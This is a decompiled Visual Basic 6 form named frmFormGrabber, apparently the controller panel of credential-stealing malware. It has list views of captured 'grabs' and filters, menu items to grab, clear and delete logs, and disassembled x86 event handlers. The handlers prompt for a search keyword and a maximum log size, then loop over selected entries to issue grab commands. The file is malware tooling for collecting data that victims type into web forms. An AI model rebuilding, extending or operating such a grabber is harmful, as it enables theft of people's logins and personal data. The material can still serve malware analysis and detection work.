VERSION 5.00
Begin VB.Form frmFormGrabber
  Caption = "Form grabber"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Icon = "frmFormGrabber.frx":0
  LinkTopic = "Form1"
  ClientLeft = 120
  ClientTop = 750
  ClientWidth = 13710
  ClientHeight = 7395
  StartUpPosition = 2 'CenterScreen
  Begin VB.Timer tmrUpdate
    Interval = 60000
    Left = 12600
    Top = 0
  End
  Begin VB.Timer tmrStats
    Interval = 500
    Left = 13080
    Top = 0
  End
  Begin XtremeSuiteControls.GroupBox gbFormGrabber
    Left = 0
    Top = 4920
    Width = 13695
    Height = 2055
    TabIndex = 2
    Begin MSComctlLib.ListView lstFilter
      Left = 120
      Top = 240
      Width = 13455
      Height = 1695
      TabIndex = 3
    End
  End
  Begin MSComctlLib.StatusBar sbStatus
    Left = 0
    Top = 7080
    Width = 13710
    Height = 315
    TabIndex = 0
  End
  Begin MSComctlLib.ListView lstGrabs
    Left = 0
    Top = 0
    Width = 13695
    Height = 4815
    TabIndex = 1
  End
  Begin VB.Menu mnuFilterMenu
    Visible = 0   'False
    Caption = "Menu"
    Begin VB.Menu mnuFilter
      Index = 0
      Caption = "Add"
    End
    Begin VB.Menu mnuFilter
      Index = 1
      Caption = "-"
    End
    Begin VB.Menu mnuFilter
      Index = 2
      Caption = "Remove"
    End
  End
  Begin VB.Menu mnuGrabMenu
    Visible = 0   'False
    Caption = "Menu"
    Begin VB.Menu mnuGrab
      Index = 0
      Caption = "Grab"
    End
    Begin VB.Menu mnuGrab
      Index = 1
      Caption = "-"
    End
    Begin VB.Menu mnuGrab
      Index = 2
      Caption = "Clear finished"
    End
    Begin VB.Menu mnuGrab
      Index = 3
      Caption = "Delete"
    End
  End
  Begin VB.Menu mnuHelp
    Caption = "Help"
  End
End

Attribute VB_Name = "frmFormGrabber"


Private sub lstFilter__8B360D
008B360D: push ebp
008B360E: mov ebp, esp
008B3610: sub esp, 0000000Ch
008B3613: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B3618: mov eax, fs:[00h]
008B361E: push eax
008B361F: mov fs:[00000000h], esp
008B3626: push 00000008h
008B3628: pop eax
008B3629: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B362E: push ebx
008B362F: push esi
008B3630: push edi
008B3631: mov var_0C, esp
008B3634: mov var_08, 0040EB00h
008B363B: mov eax, [ebp+08h]
008B363E: and eax, 00000001h
008B3641: mov var_04, eax
008B3644: mov eax, [ebp+08h]
008B3647: and al, FEh
008B3649: mov [ebp+08h], eax
008B364C: mov eax, [ebp+08h]
008B364F: mov eax, [eax]
008B3651: push [ebp+08h]
008B3654: call [eax+04h]
008B3657: mov eax, [ebp+0Ch]
008B365A: or word ptr [eax], FFFFh
008B365E: mov var_04, 00000000h
008B3665: mov eax, [ebp+08h]
008B3668: mov eax, [eax]
008B366A: push [ebp+08h]
008B366D: call [eax+08h]
008B3670: mov eax, var_04
008B3673: mov ecx, var_14
008B3676: mov fs:[00000000h], ecx
008B367D: pop edi
008B367E: pop esi
008B367F: pop ebx
008B3680: leave 
008B3681: retn 0008h
End Sub

Private sub lstFilter__8B3684
008B3684: push ebp
008B3685: mov ebp, esp
008B3687: sub esp, 0000000Ch
008B368A: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B368F: mov eax, fs:[00h]
008B3695: push eax
008B3696: mov fs:[00000000h], esp
008B369D: push 00000054h
008B369F: pop eax
008B36A0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B36A5: push ebx
008B36A6: push esi
008B36A7: push edi
008B36A8: mov var_0C, esp
008B36AB: mov var_08, 0040EB08h
008B36B2: mov eax, [ebp+08h]
008B36B5: and eax, 00000001h
008B36B8: mov var_04, eax
008B36BB: mov eax, [ebp+08h]
008B36BE: and al, FEh
008B36C0: mov [ebp+08h], eax
008B36C3: mov eax, [ebp+08h]
008B36C6: mov eax, [eax]
008B36C8: push [ebp+08h]
008B36CB: call [eax+04h]
008B36CE: mov eax, [ebp+0Ch]
008B36D1: cmp word ptr [eax], 0002h
008B36D5: jnz 008B37AFh
008B36DB: mov var_50, 80020004h
008B36E2: mov var_58, 0000000Ah
008B36E9: mov var_40, 80020004h
008B36F0: mov var_48, 0000000Ah
008B36F7: mov var_30, 80020004h
008B36FE: mov var_38, 0000000Ah
008B3705: mov var_20, 80020004h
008B370C: mov var_28, 0000000Ah
008B3713: push 00000010h
008B3715: pop eax
008B3716: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B371B: lea esi, var_58
008B371E: mov edi, esp
008B3720: movsd 
008B3721: movsd 
008B3722: movsd 
008B3723: movsd 
008B3724: push 00000010h
008B3726: pop eax
008B3727: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B372C: lea esi, var_48
008B372F: mov edi, esp
008B3731: movsd 
008B3732: movsd 
008B3733: movsd 
008B3734: movsd 
008B3735: push 00000010h
008B3737: pop eax
008B3738: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B373D: lea esi, var_38
008B3740: mov edi, esp
008B3742: movsd 
008B3743: movsd 
008B3744: movsd 
008B3745: movsd 
008B3746: push 00000010h
008B3748: pop eax
008B3749: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B374E: lea esi, var_28
008B3751: mov edi, esp
008B3753: movsd 
008B3754: movsd 
008B3755: movsd 
008B3756: movsd 
008B3757: mov eax, [ebp+08h]
008B375A: mov eax, [eax]
008B375C: push [ebp+08h]
008B375F: call [eax+00000304h]
008B3765: push eax
008B3766: lea eax, var_18
008B3769: push eax
008B376A: call 00410A84h ; Set (object)
008B376F: push eax
008B3770: mov eax, [ebp+08h]
008B3773: mov eax, [eax]
008B3775: push [ebp+08h]
008B3778: call [eax+000002BCh]
008B377E: fclex 
008B3780: mov var_5C, eax
008B3783: cmp var_5C, 00000000h
008B3787: jnl 8B37A3h
008B3789: push 000002BCh
008B378E: push 00446B98h
008B3793: push [ebp+08h]
008B3796: push var_5C
008B3799: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B379E: mov var_68, eax
008B37A1: jmp 8B37A7h
008B37A3: and var_68, 00000000h
008B37A7: lea ecx, var_18
008B37AA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008B37AF: mov var_04, 00000000h
008B37B6: push 008B37C7h
008B37BB: jmp 8B37C6h
008B37BD: lea ecx, var_18
008B37C0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008B37C5: ret 
End Sub

Private sub mnuGrab__8B6881
008B6881: push ebp
008B6882: mov ebp, esp
008B6884: sub esp, 00000018h
008B6887: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B688C: mov eax, fs:[00h]
008B6892: push eax
008B6893: mov fs:[00000000h], esp
008B689A: mov eax, 00000240h
008B689F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B68A4: push ebx
008B68A5: push esi
008B68A6: push edi
008B68A7: mov var_18, esp
008B68AA: mov var_14, 0040EC78h
008B68B1: mov eax, [ebp+08h]
008B68B4: and eax, 00000001h
008B68B7: mov var_10, eax
008B68BA: mov eax, [ebp+08h]
008B68BD: and al, FEh
008B68BF: mov [ebp+08h], eax
008B68C2: mov var_0C, 00000000h
008B68C9: mov eax, [ebp+08h]
008B68CC: mov eax, [eax]
008B68CE: push [ebp+08h]
008B68D1: call [eax+04h]
008B68D4: mov var_04, 00000001h
008B68DB: mov var_04, 00000002h
008B68E2: push FFFFFFFFh
008B68E4: call 00410A60h ; On Error ...
008B68E9: mov var_04, 00000003h
008B68F0: mov eax, [ebp+0Ch]
008B68F3: mov ax, [eax]
008B68F6: mov var_000001F4, ax
008B68FD: movsx eax, word ptr var_000001F4
008B6904: mov var_00000220, eax
008B690A: cmp var_00000220, 00000000h
008B6911: jz 8B6937h
008B6913: cmp var_00000220, 00000002h
008B691A: jz 008B74CCh
008B6920: cmp var_00000220, 00000003h
008B6927: jz 008B786Eh
008B692D: jmp 008B81D9h
008B6932: jmp 008B81D9h
008B6937: mov var_04, 00000005h
008B693E: mov var_000000B4, 80020004h
008B6948: mov var_000000BC, 0000000Ah
008B6952: mov var_000000A4, 80020004h
008B695C: mov var_000000AC, 0000000Ah
008B6966: mov var_00000094, 80020004h
008B6970: mov var_0000009C, 0000000Ah
008B697A: mov var_00000084, 80020004h
008B6984: mov var_0000008C, 0000000Ah
008B698E: mov var_74, 80020004h
008B6995: mov var_7C, 0000000Ah
008B699C: mov var_64, 80020004h
008B69A3: mov var_6C, 0000000Ah
008B69AA: mov var_000000C8, 0045A4D0h ; Enter a search keyword (leave empty for none).
008B69B4: mov var_000000D0, 00000008h
008B69BE: lea edx, var_000000D0
008B69C4: lea ecx, var_5C
008B69C7: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B69CC: lea eax, var_000000BC
008B69D2: push eax
008B69D3: lea eax, var_000000AC
008B69D9: push eax
008B69DA: lea eax, var_0000009C
008B69E0: push eax
008B69E1: lea eax, var_0000008C
008B69E7: push eax
008B69E8: lea eax, var_7C
008B69EB: push eax
008B69EC: lea eax, var_6C
008B69EF: push eax
008B69F0: lea eax, var_5C
008B69F3: push eax
008B69F4: call 00410994h ; InputBox
008B69F9: mov edx, eax
008B69FB: lea ecx, var_34
008B69FE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B6A03: lea eax, var_000000BC
008B6A09: push eax
008B6A0A: lea eax, var_000000AC
008B6A10: push eax
008B6A11: lea eax, var_0000009C
008B6A17: push eax
008B6A18: lea eax, var_0000008C
008B6A1E: push eax
008B6A1F: lea eax, var_7C
008B6A22: push eax
008B6A23: lea eax, var_6C
008B6A26: push eax
008B6A27: lea eax, var_5C
008B6A2A: push eax
008B6A2B: push 00000007h
008B6A2D: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6A32: add esp, 00000020h
008B6A35: mov var_04, 00000006h
008B6A3C: push var_34
008B6A3F: push 00000000h
008B6A41: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B6A46: test eax, eax
008B6A48: jnz 8B6A63h
008B6A4A: mov var_04, 00000007h
008B6A51: mov edx, 00442930h
008B6A56: lea ecx, var_38
008B6A59: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B6A5E: jmp 008B6B8Ah
008B6A63: mov var_04, 00000009h
008B6A6A: mov var_000000B4, 80020004h
008B6A74: mov var_000000BC, 0000000Ah
008B6A7E: mov var_000000A4, 80020004h
008B6A88: mov var_000000AC, 0000000Ah
008B6A92: mov var_00000094, 80020004h
008B6A9C: mov var_0000009C, 0000000Ah
008B6AA6: mov var_00000084, 80020004h
008B6AB0: mov var_0000008C, 0000000Ah
008B6ABA: mov var_74, 80020004h
008B6AC1: mov var_7C, 0000000Ah
008B6AC8: mov var_64, 80020004h
008B6ACF: mov var_6C, 0000000Ah
008B6AD6: mov var_000000C8, 0045A0CCh ; Enter the maximum size for filtered logs in bytes (0 for unlimited).
008B6AE0: mov var_000000D0, 00000008h
008B6AEA: lea edx, var_000000D0
008B6AF0: lea ecx, var_5C
008B6AF3: call 004109E2h ; msvbvm60.dll.__vbaVarDup
008B6AF8: lea eax, var_000000BC
008B6AFE: push eax
008B6AFF: lea eax, var_000000AC
008B6B05: push eax
008B6B06: lea eax, var_0000009C
008B6B0C: push eax
008B6B0D: lea eax, var_0000008C
008B6B13: push eax
008B6B14: lea eax, var_7C
008B6B17: push eax
008B6B18: lea eax, var_6C
008B6B1B: push eax
008B6B1C: lea eax, var_5C
008B6B1F: push eax
008B6B20: call 00410994h ; InputBox
008B6B25: mov edx, eax
008B6B27: lea ecx, var_38
008B6B2A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B6B2F: lea eax, var_000000BC
008B6B35: push eax
008B6B36: lea eax, var_000000AC
008B6B3C: push eax
008B6B3D: lea eax, var_0000009C
008B6B43: push eax
008B6B44: lea eax, var_0000008C
008B6B4A: push eax
008B6B4B: lea eax, var_7C
008B6B4E: push eax
008B6B4F: lea eax, var_6C
008B6B52: push eax
008B6B53: lea eax, var_5C
008B6B56: push eax
008B6B57: push 00000007h
008B6B59: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6B5E: add esp, 00000020h
008B6B61: mov var_04, 0000000Ah
008B6B68: push var_38
008B6B6B: push 00000000h
008B6B6D: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
008B6B72: test eax, eax
008B6B74: jnz 8B6B8Ah
008B6B76: mov var_04, 0000000Bh
008B6B7D: mov edx, 00442930h
008B6B82: lea ecx, var_38
008B6B85: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B6B8A: mov var_04, 0000000Eh
008B6B91: fldz 
008B6B93: fstp real8 ptr [008F23D4h]
008B6B99: mov var_04, 0000000Fh
008B6BA0: and [008F23D0h], 00000000h
008B6BA7: mov var_04, 00000010h
008B6BAE: cmp word ptr [008F2430h], FFFFh
008B6BB6: jnz 008B7044h
008B6BBC: mov var_04, 00000011h
008B6BC3: mov var_000000C8, 00000001h
008B6BCD: mov var_000000D0, 00000002h
008B6BD7: cmp [008F2010h], 00000000h
008B6BDE: jnz 8B6BFBh
008B6BE0: push 008F2010h
008B6BE5: push 00433984h
008B6BEA: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B6BEF: mov var_00000224, 008F2010h
008B6BF9: jmp 8B6C05h
008B6BFB: mov var_00000224, 008F2010h
008B6C05: push 00000000h
008B6C07: push 00000001h
008B6C09: push 00440E48h
008B6C0E: push 00000000h
008B6C10: push 00000018h
008B6C12: mov eax, var_00000224
008B6C18: mov eax, [eax]
008B6C1A: mov ecx, var_00000224
008B6C20: mov ecx, [ecx]
008B6C22: mov ecx, [ecx]
008B6C24: push eax
008B6C25: call [ecx+0000054Ch]
008B6C2B: push eax
008B6C2C: lea eax, var_44
008B6C2F: push eax
008B6C30: call 00410A84h ; Set (object)
008B6C35: push eax
008B6C36: lea eax, var_5C
008B6C39: push eax
008B6C3A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6C3F: add esp, 00000010h
008B6C42: push eax
008B6C43: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6C48: push eax
008B6C49: lea eax, var_48
008B6C4C: push eax
008B6C4D: call 00410A84h ; Set (object)
008B6C52: push eax
008B6C53: lea eax, var_6C
008B6C56: push eax
008B6C57: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6C5C: add esp, 00000010h
008B6C5F: push eax
008B6C60: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B6C65: mov var_000000D8, eax
008B6C6B: mov var_000000E0, 00000003h
008B6C75: mov var_000000E8, 00000001h
008B6C7F: mov var_000000F0, 00000002h
008B6C89: lea eax, var_000000D0
008B6C8F: push eax
008B6C90: lea eax, var_000000E0
008B6C96: push eax
008B6C97: lea eax, var_000000F0
008B6C9D: push eax
008B6C9E: lea eax, var_00000170
008B6CA4: push eax
008B6CA5: lea eax, var_00000160
008B6CAB: push eax
008B6CAC: lea eax, var_30
008B6CAF: push eax
008B6CB0: call 00410A3Ch ; For
008B6CB5: mov var_0000020C, eax
008B6CBB: lea eax, var_48
008B6CBE: push eax
008B6CBF: lea eax, var_44
008B6CC2: push eax
008B6CC3: push 00000002h
008B6CC5: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6CCA: add esp, 0000000Ch
008B6CCD: lea eax, var_6C
008B6CD0: push eax
008B6CD1: lea eax, var_5C
008B6CD4: push eax
008B6CD5: push 00000002h
008B6CD7: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6CDC: add esp, 0000000Ch
008B6CDF: jmp 008B7032h
008B6CE4: mov var_04, 00000012h
008B6CEB: lea eax, var_30
008B6CEE: mov var_000000C8, eax
008B6CF4: mov var_000000D0, 0000400Ch
008B6CFE: cmp [008F2010h], 00000000h
008B6D05: jnz 8B6D22h
008B6D07: push 008F2010h
008B6D0C: push 00433984h
008B6D11: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B6D16: mov var_00000228, 008F2010h
008B6D20: jmp 8B6D2Ch
008B6D22: mov var_00000228, 008F2010h
008B6D2C: push 00000000h
008B6D2E: push 00000004h
008B6D30: push 00440E58h
008B6D35: push 00000010h
008B6D37: pop eax
008B6D38: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B6D3D: lea esi, var_000000D0
008B6D43: mov edi, esp
008B6D45: movsd 
008B6D46: movsd 
008B6D47: movsd 
008B6D48: movsd 
008B6D49: push 00000001h
008B6D4B: push 00000000h
008B6D4D: push 00440E48h
008B6D52: push 00000000h
008B6D54: push 00000018h
008B6D56: mov eax, var_00000228
008B6D5C: mov eax, [eax]
008B6D5E: mov ecx, var_00000228
008B6D64: mov ecx, [ecx]
008B6D66: mov ecx, [ecx]
008B6D68: push eax
008B6D69: call [ecx+0000054Ch]
008B6D6F: push eax
008B6D70: lea eax, var_44
008B6D73: push eax
008B6D74: call 00410A84h ; Set (object)
008B6D79: push eax
008B6D7A: lea eax, var_5C
008B6D7D: push eax
008B6D7E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6D83: add esp, 00000010h
008B6D86: push eax
008B6D87: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6D8C: push eax
008B6D8D: lea eax, var_48
008B6D90: push eax
008B6D91: call 00410A84h ; Set (object)
008B6D96: push eax
008B6D97: lea eax, var_6C
008B6D9A: push eax
008B6D9B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6DA0: add esp, 00000020h
008B6DA3: push eax
008B6DA4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6DA9: push eax
008B6DAA: lea eax, var_4C
008B6DAD: push eax
008B6DAE: call 00410A84h ; Set (object)
008B6DB3: push eax
008B6DB4: lea eax, var_7C
008B6DB7: push eax
008B6DB8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6DBD: add esp, 00000010h
008B6DC0: push eax
008B6DC1: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B6DC6: sub ax, FFFFh
008B6DCA: neg ax
008B6DCD: sbb eax, eax
008B6DCF: inc eax
008B6DD0: neg eax
008B6DD2: mov var_00000140, ax
008B6DD9: lea eax, var_4C
008B6DDC: push eax
008B6DDD: lea eax, var_48
008B6DE0: push eax
008B6DE1: lea eax, var_44
008B6DE4: push eax
008B6DE5: push 00000003h
008B6DE7: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6DEC: add esp, 00000010h
008B6DEF: lea eax, var_7C
008B6DF2: push eax
008B6DF3: lea eax, var_6C
008B6DF6: push eax
008B6DF7: lea eax, var_5C
008B6DFA: push eax
008B6DFB: push 00000003h
008B6DFD: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6E02: add esp, 00000010h
008B6E05: movsx eax, word ptr var_00000140
008B6E0C: test eax, eax
008B6E0E: jz 008B700Eh
008B6E14: mov var_04, 00000013h
008B6E1B: lea eax, var_30
008B6E1E: mov var_000000C8, eax
008B6E24: mov var_000000D0, 0000400Ch
008B6E2E: cmp [008F2010h], 00000000h
008B6E35: jnz 8B6E52h
008B6E37: push 008F2010h
008B6E3C: push 00433984h
008B6E41: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B6E46: mov var_0000022C, 008F2010h
008B6E50: jmp 8B6E5Ch
008B6E52: mov var_0000022C, 008F2010h
008B6E5C: push 00000000h
008B6E5E: push 00000014h
008B6E60: push 00440E58h
008B6E65: push 00000010h
008B6E67: pop eax
008B6E68: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B6E6D: lea esi, var_000000D0
008B6E73: mov edi, esp
008B6E75: movsd 
008B6E76: movsd 
008B6E77: movsd 
008B6E78: movsd 
008B6E79: push 00000001h
008B6E7B: push 00000000h
008B6E7D: push 00440E48h
008B6E82: push 00000000h
008B6E84: push 00000018h
008B6E86: mov eax, var_0000022C
008B6E8C: mov eax, [eax]
008B6E8E: mov ecx, var_0000022C
008B6E94: mov ecx, [ecx]
008B6E96: mov ecx, [ecx]
008B6E98: push eax
008B6E99: call [ecx+0000054Ch]
008B6E9F: push eax
008B6EA0: lea eax, var_44
008B6EA3: push eax
008B6EA4: call 00410A84h ; Set (object)
008B6EA9: push eax
008B6EAA: lea eax, var_5C
008B6EAD: push eax
008B6EAE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6EB3: add esp, 00000010h
008B6EB6: push eax
008B6EB7: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6EBC: push eax
008B6EBD: lea eax, var_48
008B6EC0: push eax
008B6EC1: call 00410A84h ; Set (object)
008B6EC6: push eax
008B6EC7: lea eax, var_6C
008B6ECA: push eax
008B6ECB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6ED0: add esp, 00000020h
008B6ED3: push eax
008B6ED4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B6ED9: push eax
008B6EDA: lea eax, var_4C
008B6EDD: push eax
008B6EDE: call 00410A84h ; Set (object)
008B6EE3: push eax
008B6EE4: lea eax, var_7C
008B6EE7: push eax
008B6EE8: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B6EED: add esp, 00000010h
008B6EF0: push eax
008B6EF1: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B6EF6: mov edx, eax
008B6EF8: lea ecx, var_3C
008B6EFB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B6F00: push eax
008B6F01: call 004109DCh ; Val(arg_1)
008B6F06: fstp real8 ptr var_0000013C
008B6F0C: push 00000000h
008B6F0E: push 00000001h
008B6F10: push 00000001h
008B6F12: push 00000000h
008B6F14: lea eax, var_000000C0
008B6F1A: push eax
008B6F1B: push 00000010h
008B6F1D: push 00000880h
008B6F22: call 00410946h ; ReDim
008B6F27: add esp, 0000001Ch
008B6F2A: lea eax, var_34
008B6F2D: mov var_000000D8, eax
008B6F33: mov var_000000E0, 00004008h
008B6F3D: lea esi, var_000000E0
008B6F43: push 00000000h
008B6F45: push var_000000C0
008B6F4B: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B6F50: mov ecx, eax
008B6F52: mov edx, esi
008B6F54: call 00410940h ; msvbvm60.dll.__vbaVarZero
008B6F59: push var_38
008B6F5C: call 004109DCh ; Val(arg_1)
008B6F61: fstp real8 ptr var_000000E8
008B6F67: mov var_000000F0, 00000005h
008B6F71: lea esi, var_000000F0
008B6F77: push 00000001h
008B6F79: push var_000000C0
008B6F7F: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B6F84: mov ecx, eax
008B6F86: mov edx, esi
008B6F88: call 00410922h ; msvbvm60.dll.__vbaVarMove
008B6F8D: mov edx, 0043D9A0h ; x113
008B6F92: lea ecx, var_40
008B6F95: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B6F9A: lea eax, var_000000C0
008B6FA0: push eax
008B6FA1: lea eax, var_40
008B6FA4: push eax
008B6FA5: fld real8 ptr var_0000013C
008B6FAB: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008B6FB0: push eax
008B6FB1: call 007A6910h
008B6FB6: lea eax, var_000000C0
008B6FBC: push eax
008B6FBD: push 00000000h
008B6FBF: call 00410934h ; Erase
008B6FC4: lea eax, var_40
008B6FC7: push eax
008B6FC8: lea eax, var_3C
008B6FCB: push eax
008B6FCC: push 00000002h
008B6FCE: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B6FD3: add esp, 0000000Ch
008B6FD6: lea eax, var_4C
008B6FD9: push eax
008B6FDA: lea eax, var_48
008B6FDD: push eax
008B6FDE: lea eax, var_44
008B6FE1: push eax
008B6FE2: push 00000003h
008B6FE4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B6FE9: add esp, 00000010h
008B6FEC: lea eax, var_7C
008B6FEF: push eax
008B6FF0: lea eax, var_6C
008B6FF3: push eax
008B6FF4: lea eax, var_5C
008B6FF7: push eax
008B6FF8: push 00000003h
008B6FFA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B6FFF: add esp, 00000010h
008B7002: mov var_04, 00000014h
008B7009: call 0041096Ah ; DoEvents
008B700E: mov var_04, 00000016h
008B7015: lea eax, var_00000170
008B701B: push eax
008B701C: lea eax, var_00000160
008B7022: push eax
008B7023: lea eax, var_30
008B7026: push eax
008B7027: call 00410A36h ; Next
008B702C: mov var_0000020C, eax
008B7032: cmp var_0000020C, 00000000h
008B7039: jnz 008B6CE4h
008B703F: jmp 008B74C7h
008B7044: mov var_04, 00000018h
008B704B: mov var_000000C8, 00000001h
008B7055: mov var_000000D0, 00000002h
008B705F: cmp [008F2010h], 00000000h
008B7066: jnz 8B7083h
008B7068: push 008F2010h
008B706D: push 00433984h
008B7072: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B7077: mov var_00000230, 008F2010h
008B7081: jmp 8B708Dh
008B7083: mov var_00000230, 008F2010h
008B708D: push 00000000h
008B708F: push 00000001h
008B7091: push 00440E48h
008B7096: push 00000000h
008B7098: push 00000018h
008B709A: mov eax, var_00000230
008B70A0: mov eax, [eax]
008B70A2: mov ecx, var_00000230
008B70A8: mov ecx, [ecx]
008B70AA: mov ecx, [ecx]
008B70AC: push eax
008B70AD: call [ecx+00000550h]
008B70B3: push eax
008B70B4: lea eax, var_44
008B70B7: push eax
008B70B8: call 00410A84h ; Set (object)
008B70BD: push eax
008B70BE: lea eax, var_5C
008B70C1: push eax
008B70C2: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B70C7: add esp, 00000010h
008B70CA: push eax
008B70CB: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B70D0: push eax
008B70D1: lea eax, var_48
008B70D4: push eax
008B70D5: call 00410A84h ; Set (object)
008B70DA: push eax
008B70DB: lea eax, var_6C
008B70DE: push eax
008B70DF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B70E4: add esp, 00000010h
008B70E7: push eax
008B70E8: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008B70ED: mov var_000000D8, eax
008B70F3: mov var_000000E0, 00000003h
008B70FD: mov var_000000E8, 00000001h
008B7107: mov var_000000F0, 00000002h
008B7111: lea eax, var_000000D0
008B7117: push eax
008B7118: lea eax, var_000000E0
008B711E: push eax
008B711F: lea eax, var_000000F0
008B7125: push eax
008B7126: lea eax, var_00000190
008B712C: push eax
008B712D: lea eax, var_00000180
008B7133: push eax
008B7134: lea eax, var_30
008B7137: push eax
008B7138: call 00410A3Ch ; For
008B713D: mov var_00000210, eax
008B7143: lea eax, var_48
008B7146: push eax
008B7147: lea eax, var_44
008B714A: push eax
008B714B: push 00000002h
008B714D: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7152: add esp, 0000000Ch
008B7155: lea eax, var_6C
008B7158: push eax
008B7159: lea eax, var_5C
008B715C: push eax
008B715D: push 00000002h
008B715F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7164: add esp, 0000000Ch
008B7167: jmp 008B74BAh
008B716C: mov var_04, 00000019h
008B7173: lea eax, var_30
008B7176: mov var_000000C8, eax
008B717C: mov var_000000D0, 0000400Ch
008B7186: cmp [008F2010h], 00000000h
008B718D: jnz 8B71AAh
008B718F: push 008F2010h
008B7194: push 00433984h
008B7199: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B719E: mov var_00000234, 008F2010h
008B71A8: jmp 8B71B4h
008B71AA: mov var_00000234, 008F2010h
008B71B4: push 00000000h
008B71B6: push 00000004h
008B71B8: push 00440E58h
008B71BD: push 00000010h
008B71BF: pop eax
008B71C0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B71C5: lea esi, var_000000D0
008B71CB: mov edi, esp
008B71CD: movsd 
008B71CE: movsd 
008B71CF: movsd 
008B71D0: movsd 
008B71D1: push 00000001h
008B71D3: push 00000000h
008B71D5: push 00440E48h
008B71DA: push 00000000h
008B71DC: push 00000018h
008B71DE: mov eax, var_00000234
008B71E4: mov eax, [eax]
008B71E6: mov ecx, var_00000234
008B71EC: mov ecx, [ecx]
008B71EE: mov ecx, [ecx]
008B71F0: push eax
008B71F1: call [ecx+00000550h]
008B71F7: push eax
008B71F8: lea eax, var_44
008B71FB: push eax
008B71FC: call 00410A84h ; Set (object)
008B7201: push eax
008B7202: lea eax, var_5C
008B7205: push eax
008B7206: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B720B: add esp, 00000010h
008B720E: push eax
008B720F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7214: push eax
008B7215: lea eax, var_48
008B7218: push eax
008B7219: call 00410A84h ; Set (object)
008B721E: push eax
008B721F: lea eax, var_6C
008B7222: push eax
008B7223: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7228: add esp, 00000020h
008B722B: push eax
008B722C: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7231: push eax
008B7232: lea eax, var_4C
008B7235: push eax
008B7236: call 00410A84h ; Set (object)
008B723B: push eax
008B723C: lea eax, var_7C
008B723F: push eax
008B7240: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7245: add esp, 00000010h
008B7248: push eax
008B7249: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B724E: sub ax, FFFFh
008B7252: neg ax
008B7255: sbb eax, eax
008B7257: inc eax
008B7258: neg eax
008B725A: mov var_00000140, ax
008B7261: lea eax, var_4C
008B7264: push eax
008B7265: lea eax, var_48
008B7268: push eax
008B7269: lea eax, var_44
008B726C: push eax
008B726D: push 00000003h
008B726F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7274: add esp, 00000010h
